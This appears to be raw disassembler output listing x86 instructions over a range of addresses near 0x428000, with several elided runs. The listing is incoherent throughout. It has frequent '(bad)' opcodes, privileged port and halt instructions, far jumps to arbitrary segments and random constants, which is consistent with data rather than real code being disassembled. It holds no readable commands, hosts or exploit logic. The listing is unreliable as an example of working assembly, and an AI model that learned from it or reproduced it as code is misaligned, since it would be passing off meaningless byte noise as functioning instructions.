  4281d5:	and    BYTE PTR [esp+edi*2],al
  4281d8:	test   BYTE PTR [ecx],ah
  4281da:	jne    0x428171
  4281dc:	pop    esi
  4281dd:	sub    eax,0xcc5f9513
  4281e2:	adc    al,0xf6
  4281e4:	and    eax,0xa1ee8b38
  4281e9:	mov    edx,0x8b8de12f
  4281ee:	in     al,dx
  4281ef:	hlt    
  4281f0:	cwde   
  4281f1:	ja     0x4281c4
  4281f3:	test   DWORD PTR [edi-0x58],esi
  4281f6:	sbb    ah,BYTE PTR [esi]
  4281f8:	push   ebx
  4281f9:	push   ebx
  4281fa:	test   eax,0x592af63c
  4281ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428200:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428201:	outs   dx,BYTE PTR cs:[esi]
  428203:	inc    ecx
  428204:	xchg   edi,eax
  428205:	sti    
  428206:	mov    ds:0x4fbadf00,eax
  42820b:	aaa    
  42820c:	adc    esi,eax
  42820e:	popa   
  42820f:	in     al,dx
  428210:	test   BYTE PTR [eax+ebx*1],0x13
  428214:	jno    0x428249
  428216:	inc    ebp
  428217:	jp     0x42821d
  428219:	retf   
  42821a:	ret    0xb2a0
  42821d:	arpl   WORD PTR [edx],bp
  42821f:	(bad)  
  428220:	les    esi,FWORD PTR [edx+0x298998ff]
  428226:	mov    dh,0x4b
  428228:	xor    bl,BYTE PTR [edi+0x5a]
  42822b:	jb     0x4281d6
  42822d:	or     BYTE PTR [edx+0x9ecd575],dl
  428233:	add    eax,0x63b6c28f
  428238:	jns    0x428260
  42823a:	mov    dh,0x96
  42823c:	repnz in al,0xac
  42823f:	mov    BYTE PTR [eax-0x2f],dh
  428242:	cmp    esp,DWORD PTR [edi+eax*1-0x4879e0bb]
  428249:	xor    eax,0x4aefc255
  42824e:	add    eax,0xe10aabd9
  428253:	cdq    
  428254:	mov    edx,0x74a75a28
  428259:	jmp    0x4281e9
  42825b:	sbb    cl,dl
  42825d:	test   ebx,0x6ccbb37f
  428263:	outs   dx,DWORD PTR ds:[esi]
  428264:	cli    
  428265:	push   0xffffffcd
  428267:	or     BYTE PTR [esi-0x5d],dh
  42826a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42826b:	arpl   bp,bp
  42826d:	lea    eax,[edi+0x47]
  428270:	mov    bl,0x4e
  428272:	pop    es
  428273:	jle    0x4282a1
  428275:	adc    DWORD PTR ds:0x3c5370a8,ebp
  42827b:	push   edx
  42827c:	mov    edx,0xe6ed2542
  428281:	fs (bad) 
  428283:	in     al,0x1
  428285:	mov    cs,WORD PTR [esi]
  428287:	or     al,0x48
  428289:	loop   0x428271
  42828b:	lahf   
  42828c:	jo     0x4282b0
  42828e:	mov    cl,0xc0
	...
  4282f4:	(bad)  
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	mov    dl,0xce
  428302:	pop    esi
  428303:	mov    bh,0x3c
  428305:	lods   eax,DWORD PTR ds:[esi]
  428306:	add    DWORD PTR [eax],eax
  428308:	add    al,0x1
  42830a:	add    BYTE PTR [eax],al
  42830c:	pop    es
  42830d:	mov    edx,0x6fe18c5d
  428312:	sar    edx,cl
  428314:	jp     0x4282a0
  428316:	dec    edi
  428317:	cmp    al,0xd7
  428319:	ficom  WORD PTR [edx+0x36]
  42831c:	out    dx,eax
  42831d:	ins    BYTE PTR es:[edi],dx
  42831e:	fxch   st(0)
  428320:	jmp    0x693a:0xe1729c7
  428327:	out    0x17,al
  428329:	lods   eax,DWORD PTR ds:[esi]
  42832a:	cwde   
  42832b:	scas   al,BYTE PTR es:[edi]
  42832c:	inc    eax
  42832d:	sbb    eax,0x3358cf1b
  428332:	(bad)  
  428333:	scas   al,BYTE PTR es:[edi]
  428334:	mov    dh,cl
  428336:	dec    ebx
  428337:	sti    
  428338:	sub    BYTE PTR [edi],bh
  42833a:	push   ecx
  42833b:	ror    DWORD PTR [edx],cl
  42833d:	mov    ah,0x2b
  42833f:	add    eax,0x64c965a3
  428344:	inc    edi
  428345:	pop    ebx
  428346:	xchg   ebx,eax
  428347:	xor    edx,DWORD PTR [ebx-0x40]
  42834a:	cli    
  42834b:	add    DWORD PTR [esi-0x668be89c],ebx
  428351:	(bad)  
  428352:	lahf   
  428353:	shl    BYTE PTR [ebx+0x12],0x92
  428357:	dec    edx
  428358:	xchg   edx,eax
  428359:	mov    ecx,0xd8c44da
  42835e:	mov    edi,0x532b3304
  428363:	pushf  
  428364:	mov    bh,0xc0
  428366:	cmp    edi,eax
  428368:	xor    eax,0xe58d4501
  42836d:	mov    WORD PTR [ebp+0x13],?
  428370:	mov    al,0xaf
  428372:	loopne 0x4283b4
  428374:	inc    edx
  428375:	xor    dh,BYTE PTR [ebx+0x3aeb1a42]
  42837b:	sub    edx,esi
  42837d:	shl    DWORD PTR [ebp-0x5d],0x18
  428381:	pop    ds
  428382:	(bad)  
  428383:	mov    cl,0x6b
  428385:	dec    ebx
  428386:	or     ecx,DWORD PTR [ebp-0x46]
  428389:	pop    ebx
  42838a:	xor    edi,DWORD PTR [ebp-0x6c]
  42838d:	adc    DWORD PTR [ebx+eax*1],0x6f1b0d77
  428394:	hlt    
  428395:	nop
  428396:	pop    ss
  428397:	sbb    ebp,eax
  428399:	push   es
  42839a:	dec    eax
  42839b:	push   ebx
  42839c:	hlt    
  42839d:	dec    DWORD PTR ds:0xd926fd10
  4283a3:	(bad)  [edi+0x4b]
  4283a6:	sub    dh,ah
  4283a8:	out    dx,eax
  4283a9:	(bad)  
  4283aa:	sbb    bh,al
  4283ac:	(bad)  
  4283ad:	rcr    DWORD PTR [ecx+ebx*4+0x3d5725f2],1
  4283b4:	pop    edi
  4283b5:	push   0xfffffffd
  4283b7:	push   edi
  4283b8:	retf   
  4283b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4283ba:	aad    0x30
  4283bc:	pop    ebp
  4283bd:	mov    esi,0x121b51c9
  4283c2:	aas    
  4283c3:	inc    ebx
  4283c4:	sbb    al,cl
  4283c6:	std    
  4283c7:	test   BYTE PTR [ebx-0x50ebd796],bh
  4283cd:	mov    ds:0x296810fe,eax
  4283d2:	push   edx
  4283d3:	dec    eax
  4283d4:	jnp    0x42840b
  4283d6:	mov    es,edx
  4283d8:	mov    eax,ds:0xb186d00c
  4283dd:	pop    esp
  4283de:	out    dx,eax
  4283df:	fld    QWORD PTR [ebp+eax*8-0x1a9b53c3]
  4283e6:	out    0xe6,eax
  4283e8:	cdq    
  4283e9:	mov    ebx,0xa8d05acb
  4283ee:	cli    
  4283ef:	je     0x428411
  4283f1:	retf   0x68c4
  4283f4:	and    bl,BYTE PTR [edi]
  4283f6:	sbb    BYTE PTR [esi],dh
  4283f8:	and    eax,0xa48ba120
  4283fd:	mov    ecx,0x18840481
  428402:	jg     0x42842e
  428404:	imul   edx,DWORD PTR [ecx],0x132e9369
  42840a:	or     ch,bl
  42840c:	mov    ch,0x68
  42840e:	es jnp 0x428411
	...
  428471:	add    BYTE PTR [eax],al
  428473:	add    BYTE PTR [esi],cl
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0xfbabfb32
  428481:	add    DWORD PTR [ecx+0x62],edx
  428484:	inc    eax
  428485:	scas   al,BYTE PTR es:[edi]
  428486:	add    DWORD PTR [eax],eax
  428488:	add    al,0x1
  42848a:	add    BYTE PTR [eax],al
  42848c:	mov    esp,0xcb20718e
  428491:	or     BYTE PTR [edi-0x78],cl
  428494:	xchg   ebp,eax
  428495:	mov    BYTE PTR [esi-0x33],dh
  428498:	in     eax,0xd9
  42849a:	es cld 
  42849c:	adc    al,0xe
  42849e:	mov    bl,0x39
  4284a0:	mov    ebp,0xf531d868
  4284a5:	add    DWORD PTR [edx],0x9
  4284a8:	push   esi
  4284a9:	and    ah,cl
  4284ab:	out    0xed,al
  4284ad:	rcr    BYTE PTR [eax+0x24],1
  4284b0:	daa    
  4284b1:	leave  
  4284b2:	shr    DWORD PTR [eax],1
  4284b4:	in     al,0xb9
  4284b6:	lods   eax,DWORD PTR ds:[esi]
  4284b7:	je     0x4284d4
  4284b9:	push   esi
  4284ba:	add    esi,ecx
  4284bc:	push   eax
  4284bd:	mov    es,WORD PTR [edx-0x73]
  4284c0:	call   0xae8ced52
  4284c5:	sbb    al,0x9d
  4284c7:	aas    
  4284c8:	rep stos BYTE PTR es:[edi],al
  4284ca:	xchg   ecx,eax
  4284cb:	ret    0x6833
  4284ce:	inc    ebx
  4284cf:	sub    eax,0x22a796c6
  4284d4:	cmp    ah,BYTE PTR [ebp-0x3b]
  4284d7:	mov    bl,0x30
  4284d9:	pop    es
  4284da:	leave  
  4284db:	mov    dh,0x22
  4284dd:	push   es
  4284de:	shl    DWORD PTR [edi+0x38],1
  4284e1:	or     BYTE PTR [ecx+0x1b],bh
  4284e4:	pop    ebp
  4284e5:	sbb    eax,0xf9c7d700
  4284ea:	mov    ch,0xa4
  4284ec:	push   ebx
  4284ed:	fdivr  DWORD PTR [esi-0x65]
  4284f0:	stos   DWORD PTR es:[edi],eax
  4284f1:	mov    ds:0xd9b35c0,eax
  4284f6:	loopne 0x428491
  4284f8:	dec    eax
  4284f9:	cwde   
  4284fa:	je     0x42855b
  4284fc:	add    DWORD PTR [ebx],edx
  4284fe:	mov    dl,0xd6
  428500:	into   
  428501:	push   ss
  428502:	sahf   
  428503:	push   esi
  428504:	pop    ds
  428505:	loop   0x4284ae
  428507:	xchg   ebp,eax
  428508:	or     ebx,ecx
  42850a:	pusha  
  42850b:	out    dx,eax
  42850c:	hlt    
  42850d:	push   es
  42850e:	jecxz  0x42854e
  428510:	pop    edi
  428511:	xor    edi,esp
  428513:	fst    DWORD PTR [esp+eax*2+0x21]
  428517:	(bad)  
  428518:	xor    ebx,esp
  42851a:	add    ah,bh
  42851c:	jle    0x4284d1
  42851e:	lea    esi,[edx+ebp*4]
  428521:	push   es
  428522:	sbb    ebp,edx
  428524:	and    al,0xcf
  428526:	setp   BYTE PTR [ecx+0x69]
  42852a:	loopne 0x4284d5
  42852c:	push   edx
  42852d:	add    DWORD PTR [ecx],ebx
  42852f:	jl     0x4284ed
  428531:	adc    al,BYTE PTR [edi-0x4d]
  428534:	sbb    DWORD PTR [eax-0x47],0x3526664c
  42853b:	imul   ebx,DWORD PTR ds:0x360967f4,0xffffffe5
  428542:	stc    
  428543:	frstor [ebp+0x69c7c428]
  428549:	push   edi
  42854a:	and    eax,0x13a41b1
  42854f:	jo     0x4284d3
  428551:	xor    al,0xff
  428553:	fldenv [edx]
  428555:	mov    dh,0x30
  428557:	test   DWORD PTR [ecx],edi
  428559:	lds    ebx,FWORD PTR [edi-0x5e0c577c]
  42855f:	repz mov dh,0x34
  428562:	sub    ch,BYTE PTR [edi]
  428564:	in     al,0xef
  428566:	and    edx,DWORD PTR [esi-0x41534d67]
  42856c:	sub    bh,BYTE PTR [eax]
  42856e:	add    eax,0x4720c552
  428573:	imul   esp,DWORD PTR [eax+0x51f17a11],0xfffffffe
  42857a:	out    dx,al
  42857b:	(bad)  
  42857d:	pop    esp
  42857e:	jmp    0x74f833e3
  428583:	js     0x428569
  428585:	pop    esp
  428586:	lods   eax,DWORD PTR ds:[esi]
  428587:	in     al,0x24
  428589:	add    dh,BYTE PTR [edx+0x5a87a1eb]
  42858f:	add    al,0x0
	...
  4285f1:	add    BYTE PTR [eax],al
  4285f3:	add    BYTE PTR [ecx-0xa],dl
  4285f6:	xor    eax,0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0x6013a3f6
  428602:	xchg   edx,eax
  428603:	add    al,0x44
  428605:	scas   eax,DWORD PTR es:[edi]
  428606:	add    DWORD PTR [eax],eax
  428608:	add    al,0x1
  42860a:	add    BYTE PTR [eax],al
  42860c:	outs   dx,BYTE PTR ds:[esi]
  42860d:	or     al,0x85
  42860f:	sbb    eax,0x1b802f62
  428614:	mov    dl,0x84
  428616:	(bad)  
  428617:	adc    bl,BYTE PTR [ebp+0x1b]
  42861a:	inc    edx
  42861b:	jbe    0x428694
  42861d:	sub    al,0x3d
  42861f:	cwde   
  428620:	ss ins DWORD PTR es:[edi],dx
  428622:	retf   0x7a6a
  428625:	outs   dx,DWORD PTR ds:[esi]
  428626:	into   
  428627:	stos   DWORD PTR es:[edi],eax
  428628:	inc    edx
  428629:	test   al,0x7d
  42862b:	pop    edx
  42862c:	(bad)  
  42862d:	fild   DWORD PTR [ebx]
  42862f:	and    al,0x8a
  428631:	mov    dl,0xb0
  428633:	mov    bh,0xab
  428635:	xchg   edx,eax
  428636:	(bad)  
  428637:	mov    ds:0x32b704cc,eax
  42863c:	imul   BYTE PTR [ebp-0x65]
  42863f:	jmp    0x5fb9:0xcdba39bf
  428646:	cmp    al,0x6f
  428648:	pop    ebx
  428649:	les    edx,FWORD PTR [ebp-0x7f]
  42864c:	leave  
  42864d:	xor    eax,0x622d6ae3
  428652:	in     al,dx
  428653:	dec    ecx
  428654:	retf   0x3121
  428657:	mov    eax,ds:0xd4ff1dec
  42865c:	jno    0x428626
  42865e:	and    dh,ch
  428660:	into   
  428661:	sub    ebp,DWORD PTR [ecx+eiz*8]
  428664:	out    0xdc,eax
  428666:	in     eax,dx
  428667:	adc    dh,BYTE PTR [esi-0x1d]
  42866a:	push   esi
  42866b:	sub    dl,bl
  42866d:	les    ecx,FWORD PTR [ebx+0x7012fed9]
  428673:	mov    WORD PTR ds:0xd38562b,es
  428679:	pop    esi
  42867a:	xchg   BYTE PTR [esi+0x74],ch
  42867d:	(bad)  
  42867e:	xchg   ebx,eax
  42867f:	ins    DWORD PTR es:[edi],dx
  428680:	push   0xffffffe0
  428682:	sbb    edx,DWORD PTR [ebx-0x548a982a]
  428688:	pusha  
  428689:	mov    esp,0x46647148
  42868e:	outs   dx,DWORD PTR ds:[esi]
  42868f:	push   ss
  428690:	inc    ebp
  428691:	mov    ebp,DWORD PTR [ecx-0x52f633fa]
  428697:	dec    ebp
  428698:	mov    ecx,0xbcfc0c27
  42869d:	mov    ebp,0x58a3cebd
  4286a2:	mov    ebp,0x52ac4da0
  4286a7:	xchg   DWORD PTR [ebx],edx
  4286a9:	cmp    DWORD PTR [ecx],ebp
  4286ab:	mov    ?,WORD PTR [esi-0x53]
  4286ae:	pop    es
  4286af:	das    
  4286b0:	xchg   BYTE PTR [ecx],bl
  4286b2:	sub    ah,BYTE PTR [ecx+edi*4+0x587c70e8]
  4286b9:	leave  
  4286ba:	push   eax
  4286bb:	push   0xfe268ba4
  4286c0:	push   esi
  4286c1:	mov    ecx,0x82b142cf
  4286c6:	sbb    ebp,edx
  4286c8:	jnp    0x428734
  4286ca:	xor    al,0x8b
  4286cc:	xor    eax,0xc1bc3c60
  4286d1:	popf   
  4286d2:	xchg   BYTE PTR [ebp+0x137573fc],ah
  4286d8:	inc    esp
  4286d9:	fild   DWORD PTR es:[eax-0x336f35b4]
  4286e0:	std    
  4286e1:	ficomp DWORD PTR [edi]
  4286e3:	clc    
  4286e4:	and    al,0x28
  4286e6:	sub    al,0x5e
  4286e8:	rcl    ch,cl
  4286ea:	xor    BYTE PTR [edi-0xb8798f8],ch
  4286f0:	xor    ch,BYTE PTR [esi]
  4286f2:	or     al,0xe4
  4286f4:	enter  0x23d8,0x71
  4286f8:	out    dx,eax
  4286f9:	fisttp WORD PTR [eax+0x7b9c3df2]
  4286ff:	out    0x64,al
  428701:	add    DWORD PTR [esi+eax*8+0xa02c340],0xf761bbed
  42870c:	shl    BYTE PTR [ecx+0x2f8f],0x0
	...
  428773:	add    BYTE PTR [esi+0x5b],dl
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0xff84ed96
  428783:	das    
  428784:	dec    eax
  428785:	mov    al,0x1
  428787:	add    BYTE PTR [ecx+eax*1],al
  42878a:	add    BYTE PTR [eax],al
  42878c:	mov    eax,ds:0x587174d2
  428791:	je     0x428770
  428793:	cmp    edi,edi
  428795:	int    0xc7
  428797:	retf   
  428798:	(bad)  
  42879a:	idiv   ah
  42879c:	sbb    esi,DWORD PTR [ebx]
  42879e:	shl    BYTE PTR [edx],1
  4287a0:	jo     0x42874d
  4287a2:	scas   al,BYTE PTR es:[di]
  4287a4:	pop    ebp
  4287a5:	test   BYTE PTR [edi+0x34],bl
  4287a8:	mov    ah,0x9d
  4287aa:	in     eax,0x56
  4287ac:	jl     0x42876f
  4287ae:	push   ebp
  4287af:	retf   0x513
  4287b2:	out    dx,eax
  4287b3:	sub    al,0xbf
  4287b5:	sub    eax,ebp
  4287b7:	test   eax,0xd7e19812
  4287bc:	xchg   BYTE PTR [edi],al
  4287be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4287bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4287c0:	icebp  
  4287c1:	aaa    
  4287c2:	jl     0x4287d3
  4287c4:	push   ecx
  4287c5:	inc    ecx
  4287c6:	dec    edx
  4287c7:	sbb    dl,BYTE PTR [ecx-0x7a311634]
  4287cd:	test   DWORD PTR [esi],ecx
  4287cf:	sub    BYTE PTR [esi+0x7d32bae3],0x8
  4287d6:	int3   
  4287d7:	pop    edi
  4287d8:	js     0x4287bc
  4287da:	cmp    DWORD PTR [edx],edx
  4287dc:	sub    ebx,DWORD PTR [edi+0x0]
  4287df:	stos   BYTE PTR es:[edi],al
  4287e0:	fcom   st(1)
  4287e2:	jl     0x428816
  4287e4:	mov    al,0xf0
  4287e6:	adc    dh,BYTE PTR [edx]
  4287e8:	add    BYTE PTR ds:[ebp-0x3adf3839],0x2c
  4287f0:	mov    cl,BYTE PTR [ebx-0x6c]
  4287f3:	jle    0x428843
  4287f5:	ins    DWORD PTR es:[edi],dx
  4287f6:	mov    dh,0x42
  4287f8:	inc    ebx
  4287f9:	pop    eax
  4287fa:	pop    esi
  4287fb:	mov    ah,BYTE PTR [ebp+0x685185a]
  428801:	fbld   TBYTE PTR [ecx-0x17]
  428804:	test   dh,al
  428806:	mov    ebp,0x123dc6bb
  42880b:	mov    al,ds:0x2256f16d
  428810:	ror    esi,1
  428812:	clc    
  428813:	leave  
  428814:	retf   
  428815:	lea    eax,[edx-0x75]
  428818:	and    esp,esp
  42881a:	fs stos DWORD PTR es:[edi],eax
  42881c:	loope  0x428824
  42881e:	ss mov dh,0xaa
  428821:	push   edx
  428822:	(bad)  
  428823:	clc    
  428824:	xor    BYTE PTR [ebx],ch
  428826:	push   esi
  428827:	xor    DWORD PTR ds:0x634382ef,eax
  42882d:	(bad)
  428831:	jg     0x428831
  428833:	sbb    eax,0xc55d06ec
  428838:	xor    ah,BYTE PTR [edx*2+0x3ad04a84]
  42883f:	pop    esi
  428840:	cli    
  428841:	cld    
  428842:	cmp    DWORD PTR [ebp-0x504fd550],ebp
  428848:	inc    esi
  428849:	pusha  
  42884a:	or     BYTE PTR [ebp-0x1a],al
  42884d:	pop    esp
  42884e:	sti    
  42884f:	(bad)  [esi]
  428851:	dec    edi
  428852:	pop    esp
  428853:	or     ch,al
  428855:	imul   esp,DWORD PTR [esp+eiz*8+0x12],0xffffffc7
  42885a:	push   0xe4f838ad
  42885f:	pop    esi
  428860:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428861:	mov    ah,0xae
  428863:	push   0x83d43c17
  428868:	pop    ecx
  428869:	mov    dl,0xd5
  42886b:	or     DWORD PTR [ecx],ebp
  42886d:	sbb    BYTE PTR [ecx],dl
  42886f:	fldenv ds:[ecx+eax*4-0x2b]
  428874:	(bad)  
  428876:	imul   ebx,DWORD PTR [ecx-0x31],0xab29b04
  42887d:	jbe    0x4288be
  42887f:	shl    BYTE PTR [edx-0x56],cl
  428882:	push   edi
  428883:	retf   
  428884:	repz icebp 
  428886:	std    
  428887:	in     eax,0x37
  428889:	push   ebp
  42888a:	jo     0x428908
  42888c:	ins    BYTE PTR es:[edi],dx
  42888d:	pop    esp
  42888e:	jecxz  0x42884b
	...
  4288f4:	es jp  0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi-0x37bc62f1],bx
  428902:	adc    cl,BYTE PTR [ebx+0x4c]
  428905:	mov    cl,0x1
  428907:	add    BYTE PTR [ecx+eax*1],al
  42890a:	add    BYTE PTR [eax],al
  42890c:	std    
  42890d:	jp     0x428941
  42890f:	lea    ebx,[ebx]
  428911:	shl    BYTE PTR [edi-0x66ed4c13],0x77
  428918:	pop    ebx
  428919:	push   esp
  42891a:	and    esi,0xdc4ac564
  428920:	fwait
  428921:	xor    ebp,esi
  428923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428924:	push   esp
  428925:	fstp   TBYTE PTR [ebx+ecx*8]
  428928:	pushf  
  428929:	pop    ebp
  42892a:	sub    cl,BYTE PTR [ecx]
  42892c:	fcomp  DWORD PTR [esp+ecx*4-0x5d]
  428930:	and    BYTE PTR [ebx],dh
  428932:	push   esi
  428933:	xchg   edx,eax
  428934:	call   0xf85f224c
  428939:	jmp    0x42894c
  42893b:	sub    DWORD PTR [edi],esi
  42893d:	cmp    eax,0x49b717f8
  428942:	cmp    dh,ah
  428944:	pop    ecx
  428945:	in     al,0xf9
  428947:	sub    esi,ecx
  428949:	mov    ch,0xab
  42894b:	ja     0x4288de
  42894d:	sbb    BYTE PTR [edi+0x63],ch
  428950:	or     DWORD PTR [edi-0x9],edi
  428953:	jle    0x4288f8
  428955:	sti    
  428956:	mov    BYTE PTR [ebx+0x6156b08d],dl
  42895c:	mov    esp,0x854554cb
  428961:	jae    0x4289c9
  428963:	imul   edi,ebp,0x2b233e6f
  428969:	lock jle 0x42892a
  42896c:	lahf   
  42896d:	push   esi
  42896e:	adc    al,0xec
  428970:	push   edi
  428971:	rcr    edx,1
  428973:	pop    edx
  428974:	pop    ss
  428975:	add    dh,BYTE PTR [edx-0x766c3fec]
  42897b:	outs   dx,DWORD PTR ds:[esi]
  42897c:	mov    bl,0x3e
  42897e:	xchg   edx,eax
  42897f:	sub    eax,0x318de84e
  428984:	cmp    esp,DWORD PTR [edx]
  428986:	call   0x45e54691
  42898b:	xchg   DWORD PTR [esi],eax
  42898d:	inc    ebx
  42898e:	cmp    BYTE PTR [ecx],dh
  428990:	add    eax,0xed879a38
  428995:	test   BYTE PTR fs:[edx-0x1de05e4],0xfd
  42899d:	adc    cl,bh
  42899f:	bound  esi,QWORD PTR [edi-0x362ee31d]
  4289a5:	iret   
  4289a6:	ret    0x6e0f
  4289a9:	lahf   
  4289aa:	ret    
  4289ab:	dec    ebp
  4289ac:	cmp    esi,edi
  4289ae:	pop    ecx
  4289af:	arpl   WORD PTR [edx-0x31],di
  4289b2:	add    eax,0x877b4e79
  4289b7:	adc    eax,0xe20c634e
  4289bc:	lods   eax,DWORD PTR ds:[esi]
  4289bd:	out    dx,al
  4289be:	sub    eax,0x87f5dfa5
  4289c3:	pop    esi
  4289c4:	and    BYTE PTR [ecx+0x3f0776bb],dl
  4289ca:	sbb    ebx,ebp
  4289cc:	int    0x6
  4289ce:	push   0xffffffd6
  4289d0:	fild   DWORD PTR [ecx]
  4289d2:	or     eax,0xb946bd66
  4289d7:	(bad)  
  4289d8:	jecxz  0x428998
  4289da:	jecxz  0x4289d0
  4289dc:	or     al,0x2b
  4289de:	adc    BYTE PTR cs:[ebx+0x3c],dl
  4289e2:	cmp    DWORD PTR [edi-0x27],edx
  4289e5:	fiadd  WORD PTR [edx-0x71]
  4289e8:	sub    ah,BYTE PTR [eax-0x5d5a3684]
  4289ee:	js     0x42899f
  4289f0:	mov    BYTE PTR cs:[ebx],ch
  4289f3:	add    eax,0xeb86c596
  4289f8:	pop    es
  4289f9:	inc    ebp
  4289fa:	mov    ds:0xb6d13ad6,al
  4289ff:	retf   
  428a00:	cdq    
  428a01:	mov    BYTE PTR [eax],bh
  428a03:	out    0x29,al
  428a05:	push   ebp
  428a06:	add    eax,0xf919fbee
  428a0b:	push   ds
  428a0c:	fs push edx
  428a0e:	jno    0x428a07
	...
  428a74:	dec    ebp
  428a75:	or     al,0xf8
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax-0x7aa8bbed]
  428a83:	push   eax
  428a84:	push   eax
  428a85:	mov    dl,0x1
  428a87:	add    BYTE PTR [ecx+eax*1],al
  428a8a:	add    BYTE PTR [eax],al
  428a8c:	ja     0x428a57
  428a8e:	inc    esp
  428a8f:	cwde   
  428a90:	adc    BYTE PTR [edx-0x3c],ah
  428a93:	nop
  428a94:	mov    ds:0x3e27f5b7,al
  428a99:	popf   
  428a9a:	sbb    ebp,ecx
  428a9c:	lahf   
  428a9d:	xor    al,0xdb
  428a9f:	inc    ebp
  428aa0:	dec    edi
  428aa1:	cmp    cl,BYTE PTR [ebx*2-0x6a48e3db]
  428aa8:	push   edx
  428aa9:	fbstp  TBYTE PTR es:[edi]
  428aad:	int    0xac
  428aaf:	jo     0x428af6
  428ab1:	in     eax,dx
  428ab2:	sbb    eax,0x3eeb1bf
  428ab7:	data16 mov bh,0xd3
  428aba:	pop    ss
  428abb:	fld    DWORD PTR [ebp+0xd968774]
  428ac1:	jne    0x428ae1
  428ac3:	push   esi
  428ac4:	rol    DWORD PTR [eax],0xc
  428ac7:	fsub   QWORD PTR [ecx]
  428ac9:	push   ebx
  428aca:	or     esi,DWORD PTR [edx-0x17]
  428acd:	addr16 cvtps2pd xmm0,xmm2
  428ad1:	pop    eax
  428ad2:	call   0xb6aa:0xac8433bd
  428ad9:	and    DWORD PTR [esi+ebp*4],ebx
  428adc:	adc    DWORD PTR [edx],edi
  428ade:	mov    DWORD PTR ds:0xc2532400,edx
  428ae4:	cmc    
  428ae5:	mov    bh,0x62
  428ae7:	cmp    DWORD PTR [eax],edx
  428ae9:	repnz fwait
  428aeb:	loop   0x428b01
  428aed:	push   ss
  428aee:	into   
  428aef:	pop    ecx
  428af0:	loope  0x428b28
  428af2:	(bad)
  428af5:	pop    ebp
  428af6:	iret   
  428af7:	cmp    eax,0x316ffcd7
  428afc:	cs lahf 
  428afe:	cmp    ah,ch
  428b00:	fcomp  DWORD PTR [esi-0x6e]
  428b03:	test   BYTE PTR [eax],ch
  428b05:	mov    ds:0x8233dc6f,eax
  428b0a:	jp     0x428b53
  428b0c:	xor    bl,bh
  428b0e:	sbb    al,0x64
  428b10:	add    al,0xd
  428b12:	bound  eax,QWORD PTR [esi+0x573268dd]
  428b18:	cmc    
  428b19:	pop    edi
  428b1a:	outs   dx,BYTE PTR ds:[esi]
  428b1b:	in     eax,0xcd
  428b1d:	ret    
  428b1e:	(bad)  
  428b1f:	mov    cl,0xb0
  428b21:	cwde   
  428b22:	loop   0x428b7d
  428b24:	jle    0x428b85
  428b26:	pusha  
  428b27:	mov    esp,DWORD PTR [ebp-0x18]
  428b2a:	mov    esi,0xfbf4b0cf
  428b2f:	pushf  
  428b30:	xchg   esp,eax
  428b31:	scas   al,BYTE PTR es:[edi]
  428b32:	fild   WORD PTR ds:0xca186da8
  428b38:	inc    esp
  428b39:	fcom   DWORD PTR [ebx-0xfa531d3]
  428b3f:	adc    ebp,DWORD PTR [esi+eax*2-0x7e]
  428b43:	or     BYTE PTR [esi-0x41224fd5],0x62
  428b4a:	sbb    BYTE PTR [ebx-0x2],bl
  428b4d:	xchg   esp,eax
  428b4e:	mov    cl,ch
  428b50:	mov    ds:0x3f8b28c5,al
  428b55:	imul   BYTE PTR [edx-0x32]
  428b58:	(bad)  
  428b59:	retf   0xabac
  428b5c:	hlt    
  428b5d:	xchg   ebp,eax
  428b5e:	dec    ecx
  428b5f:	les    ebp,FWORD PTR [edi+0x10648669]
  428b65:	push   ds
  428b66:	inc    ebp
  428b67:	jb     0x428bbf
  428b69:	adc    ecx,DWORD PTR [ebx]
  428b6b:	fwait
  428b6c:	adc    ebp,esi
  428b6e:	adc    eax,0x257a4834
  428b73:	into   
  428b74:	xor    DWORD PTR [eax-0x52],edi
  428b77:	int3   
  428b78:	or     DWORD PTR [eax-0x47],ebp
  428b7b:	in     eax,0x3c
  428b7d:	mov    edx,0x8d212009
  428b82:	jg     0x428bd2
  428b84:	jns    0x428bae
  428b86:	aam    0x6
  428b88:	es mov ah,0x6d
  428b8b:	out    0xc7,al
  428b8d:	push   cs
  428b8e:	sbb    al,0xfa
	...
  428bf4:	lds    edx,FWORD PTR [ebp-0x76]
  428bf7:	cli    
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0x31f9a420
  428c04:	push   esp
  428c05:	mov    bl,0x1
  428c07:	add    BYTE PTR [ecx+eax*1],al
  428c0a:	add    BYTE PTR [eax],al
  428c0c:	test   DWORD PTR [eax+0x11],eax
  428c0f:	xchg   ebp,eax
  428c10:	sub    bh,bl
  428c12:	pop    edi
  428c13:	inc    edx
  428c14:	shl    BYTE PTR [esi+0x6],1
  428c17:	leave  
  428c18:	test   ebp,edi
  428c1a:	xor    DWORD PTR [esi],edi
  428c1c:	out    0x43,eax
  428c1e:	xchg   edi,eax
  428c1f:	cld    
  428c20:	dec    esp
  428c21:	pop    ebp
  428c22:	xlat   BYTE PTR ds:[ebx]
  428c23:	in     eax,0x80
  428c25:	aam    0x5a
  428c27:	out    0xb4,al
  428c29:	iret   
  428c2a:	and    eax,0x37d4236c
  428c2f:	outs   dx,DWORD PTR ds:[esi]
  428c30:	aas    
  428c31:	clc    
  428c32:	in     eax,0x44
  428c34:	(bad)  
  428c35:	xor    BYTE PTR [edi+0x39],bl
